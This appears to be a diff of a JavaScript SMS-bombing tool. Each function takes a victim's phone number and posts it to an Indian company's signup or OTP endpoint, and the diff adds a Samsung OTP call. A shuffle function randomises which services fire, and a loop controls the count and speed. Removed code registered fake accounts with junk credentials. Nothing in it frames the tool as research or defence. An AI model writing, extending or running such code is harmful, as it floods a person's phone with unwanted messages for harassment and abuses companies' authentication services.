@@ -468,7 +468,14 @@ async function nxtwave(number) {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ "data": "\"{\\\"phone_number\\\":\\\"" + number + "\\\",\\\"country_code\\\":\\\"+91\\\"}\"", "clientKeyDetailsId": 1 })
-                }).then(res => res.json()).then((data) => {
+                }).then((res) => {
+                    let contenttype = res.headers.get("content-type")
+                    if (contenttype && contenttype.includes("application/json") === true) {
+                        return res.json()
+                    } else {
+                        resolve(false)
+                    }
+                }).then((data) => {
                     if (data.user_id)
                         resolve(true)
                     else {
@@ -641,61 +648,6 @@ async function probo(number) {
     })
 }
 
-async function eatclub(number) {
-    return new Promise(async (resolve) => {
-        let res = await fetch("https://accounts.box8.co.in/device/register?brand_id=19&device_id=" + hoichoirandom() + "twj-xpo7-1fv8-nb1w-" + hoichoirandom() + "sh2kvzz&platform=web&device_token=null&token=&origin=eatClub")
-        let data = await res.json()
-        let authorization = data.unsigned_auth_token
-        fetch("https://accounts.box8.co.in/customers/sign_up?origin=eatClub&platform=web", {
-            method: "POST",
-            headers: {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                "Content-Type": "application/json",
-                "authorization": authorization
-            },
-            body: JSON.stringify({
-                "phone_no": number,
-                "name": "sadsf",
-                "email": "dgsghs@gmail.com",
-                "password": "dsafsdg"
-            })
-        }).then((res) => {
-            let contenttype = res.headers.get("content-type")
-            if (contenttype && contenttype.includes("application/json") === true) {
-                return res.json()
-            } else {
-                resolve(false)
-            }
-        }).then((data) => {
-            if (data?.meta.status === "Not OK") {
-                fetch("https://accounts.box8.co.in/customers/change_phone?origin=eatClub&platform=web", {
-                    method: "POST",
-                    headers: {
-                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-                        "Content-Type": "application/json",
-                        "authorization": authorization
-                    },
-                    body: JSON.stringify({ "phone_no": number })
-                }).then((res) => {
-                    let contenttype = res.headers.get("content-type")
-                    if (contenttype && contenttype.includes("application/json") === true) {
-                        return res.json()
-                    } else {
-                        resolve(false)
-                    }
-                }).then((data) => {
-                    if (data?.meta.status === "OK")
-                        resolve(true)
-                    resolve(false)
-                })
-            } else
-                resolve(true)
-        }).catch((err) => {
-            console.log("error occured during fetch: eatclub" + err);
-            resolve(false)
-        });
-    })
-}
 
 function hoichoirandom() {
     let ans = ""
@@ -1030,6 +982,28 @@ async function uspolo(number) {
     })
 }
 
+async function samson(number) {
+    return new Promise((resolve)=>{
+        fetch("https://www.samsung.com/in/api/v1/sso/otp/init",{
+            method:"POST",
+            headers:{
+                "Content-Type": "application/json"
+            },
+            body:JSON.stringify({"user_id":number})
+        }).then((res)=>{
+            let contenttype = res.headers.get("content-type")
+            if (contenttype && contenttype.includes("application/json") === true) {
+                return res.json()
+            } else {
+                resolve(false)
+            }
+        }).then((data)=>{
+            resolve(data?.statusCode === 200)
+        })
+    })
+    
+}
+
 
 async function eachcall(number,limit,t,list,ws,speed){
     if(limit === 0) return;
@@ -1054,9 +1028,20 @@ function getdate(){
     return date.toString()
 }
 
+function shuffle(){
+    let list = [samson, ajio, blinkit, byjus, derma, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
+    for(let i = list.length-1; i>0; i--){
+        let j = parseInt(Math.random() * (i+1))
+        let temp = list[i]
+        list[i] = list[j]
+        list[j] = temp
+    }
+    return list
+}
+
 async function sendsms(number, ws, limit, speed) {
     adddata(number,limit,getdate())
-    let list = [ajio, blinkit, byjus, derma, eatclub, fancode, fantv, gamezone, hoichoi, housing, infinitylearn, jar, jiocinema, kukufm, medibuddy, mamaearth, momsco, my11circle, mywallety, netmeds, probo, tradex, unacademy, uspolo, zee5, zomato, nxtwave]
+    let list = shuffle()
     eachcall(number,limit,0,list,ws,speed)
 }
 
